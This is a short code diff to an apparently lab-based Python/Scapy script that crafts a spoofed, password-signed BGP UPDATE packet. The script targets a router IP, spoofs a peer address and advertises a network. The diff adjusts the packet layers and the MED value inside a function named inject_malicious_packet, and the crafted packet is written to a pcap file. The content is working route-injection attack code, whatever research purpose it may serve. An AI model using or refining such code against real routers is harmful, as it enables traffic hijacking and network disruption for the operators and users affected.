@@ -13,7 +13,7 @@ IP_TARGET = "192.168.12.1"
 IP_TO_SPOOF = "192.168.12.2"
 NETWORK_TO_ADVERTISE = "192.168.100.0/24"
 NEXT_HOP = "192.168.12.2"
-MULTI_EXIT_DISC = "0"
+MULTI_EXIT_DISC = 0
 ORIGIN = "IGP"
 PATH = [2]
 #LOCAL_PREF = 87
@@ -73,13 +73,14 @@ def inject_malicious_packet(seq_num, ack_num, source_port):
     tcp = TCP(sport=source_port, dport=BGP_PORT, flags="PA")
     tcp.seq = seq_num
     tcp.ack = ack_num
-    hdr = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)  
+    #hdr = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)
     bgp_packet = craft_BGP_update_packet(NETWORK_TO_ADVERTISE, path=PATH, next_hop=NEXT_HOP, origin=ORIGIN,
                                          multi_exit_disc=MULTI_EXIT_DISC)
-    packet = Ether()/ ip / tcp / hdr / bgp_packet
+    packet = Ether() / ip / tcp / bgp_packet
+    packet.display()
     signed_packet = sign_single_packet(packet, BGP_password)
     #recompute packet to compute checksums
-    signed_packet = signed_packet.__class__(bytes(signed_packet))
+    #signed_packet = signed_packet.__class__(bytes(signed_packet))
     #signed_packet.show()
     signed_packet.display()
     wrpcap('update_example_crafted .pcap', signed_packet)
